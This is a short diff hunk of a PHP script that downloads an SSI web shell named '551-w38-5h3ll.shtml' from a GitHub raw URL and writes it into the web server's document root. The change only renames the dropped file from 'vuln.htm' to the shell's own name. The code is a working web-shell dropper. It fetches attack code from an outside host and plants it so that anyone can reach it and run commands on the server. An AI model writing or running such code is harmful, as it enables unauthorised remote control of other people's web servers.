@@ -20,7 +20,7 @@ if(file_exists($check)){
   echo "not exits";
 echo "done .\n " ;
 
-$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
+$check2 = $_SERVER['DOCUMENT_ROOT'] . "/551-w38-5h3ll.shtml" ;
 $text2 = http_get('https://raw.githubusercontent.com/4rthurp0l4n0/Botsll/master/551-w38-5h3ll.shtml');
 $open2 = fopen($check2, 'w');
 fwrite($open2, $text2);
